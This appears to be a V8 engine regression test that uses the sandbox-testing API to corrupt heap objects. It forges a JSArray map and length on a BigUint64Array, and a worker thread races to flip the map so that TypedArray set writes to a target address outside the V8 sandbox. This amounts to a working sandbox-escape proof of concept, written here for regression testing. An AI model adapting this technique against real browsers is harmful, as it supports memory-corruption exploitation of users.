// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kJSArrayBufferBackingStoreOffset = 0x24;
const kSandboxSizeLog2 = 40;
const kSandboxedPointerShift = 64 - kSandboxSizeLog2;
const kHeapNumberValueOffset = 4;
const kJSArrayLengthOffset = 0xc;
const kMapOffset = 0;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ptr) {
  return Sandbox.getObjectAt(ptr);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function abptr(ab) {
  let ab_ofs = getField64(getPtr(ab),
      kJSArrayBufferBackingStoreOffset) >> BigInt(kSandboxedPointerShift);
  let base = BigInt(Sandbox.base) + ab_ofs;
  return base;
}

let MAX_TRIES = 0x5000;
let TARGET = 0x424242424240n;
let VALUE = 0x434343434343n;

let buffer = new WebAssembly.Memory(
    {initial: 0x20, maximum: 0x20, shared: true}).buffer;
let u64s = new BigUint64Array(buffer);
u64s[0] = VALUE;
let u64a = new BigUint64Array(0x100000);
let arr = [];

let kBigUint64ArrayMap = getField(getPtr(u64s), kMapOffset);
let kJSArrayMap = getField(getPtr(arr), kMapOffset);

// Make u64s a "polymorphic" object of BigUint64Array & JSArray.
let ofs_idx_bi = (TARGET - abptr(u64a.buffer)) / 8n;
let ofs_idx = Number(ofs_idx_bi);
if (BigInt(ofs_idx) != ofs_idx_bi) {
  console.log(`[!] precision loss`);
}
// Set fake length field.
let fake_len = Number((-ofs_idx_bi & ((1n<<64n) - 1n)) + 0x10000n);
setField(getPtr(u64s), kJSArrayLengthOffset, getPtr(fake_len));

// Set fake JSArray map.
setField(getPtr(u64s), kMapOffset, kJSArrayMap);

let workerScript = `
  // Prepare corruption utilities.
  const kHeapObjectTag = 1;
  const kMapOffset = 0;
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
  }
  let u64s_ptr = ${getPtr(u64s)};
  let kBigUint64ArrayMap = ${kBigUint64ArrayMap};
  let kJSArrayMap = ${kJSArrayMap};
  while (true) {
    for (let i = 0; i < 0x10; i++) {
      setField(u64s_ptr, 0, kBigUint64ArrayMap);
    }
    setField(u64s_ptr, 0, kBigUint64ArrayMap);
    // Only make it a JSArray for TypedArrayPrototypeSetArray.
    setField(u64s_ptr, 0, kJSArrayMap);
    setField(u64s_ptr, 0, kBigUint64ArrayMap);
    for (let i = 0; i < 0x10; i++) {
      setField(u64s_ptr, 0, kBigUint64ArrayMap);
    }
  }
`;
let worker = new Worker(workerScript, {type: 'string'});
for (let i = 0; i < 1000000; i++);

for (let i = 0; i < MAX_TRIES; i++) {
  try {
    u64a.set(u64s, ofs_idx);
  } catch { }
}
